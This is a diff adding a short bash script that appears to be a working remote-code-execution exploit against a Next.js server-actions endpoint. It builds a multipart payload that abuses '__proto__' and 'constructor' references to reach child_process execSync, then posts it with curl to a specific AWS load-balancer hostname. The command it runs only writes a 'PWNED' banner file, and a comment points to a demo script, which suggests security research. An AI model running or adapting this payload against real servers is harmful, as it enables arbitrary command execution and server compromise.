@@ -1,0 +1,34 @@
+#!/bin/bash
+TARGET="a5b854fc6d10f4787bed4faf4bdc4c37-70723f05da021eea.elb.ap-southeast-2.amazonaws.com"
+PORT=80
+PAYLOAD_FILE="/tmp/payload.bin"
+
+# Command: echo '{"message":"PWNED"}' > /tmp/banner.json
+# We use base64 to avoid quoting hell: echo eyJtZXNzYWdlIjoiUFdORUQifQ== | base64 -d > /tmp/banner.json
+
+CMD='echo eyJtZXNzYWdlIjoiUFdORUQifQ== | base64 -d > /tmp/banner.json'
+
+# Construct payload using the proven python generator from wiz-demo.sh
+python3 -c "
+import sys
+payload = '''------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name=\"0\"
+
+{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('$CMD');\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}\
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name=\"1\"
+
+\"$@0\"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
+Content-Disposition: form-data; name=\"2\"
+
+[]\r
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
+'''
+sys.stdout.buffer.write(payload.replace('\\r\\n', '\r\n').encode())
+" > "$PAYLOAD_FILE"
+
+curl -v -X POST "http://${TARGET}:${PORT}" \
+    -H "Next-Action: x" \
+    -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad" \
+    --data-binary @"$PAYLOAD_FILE"
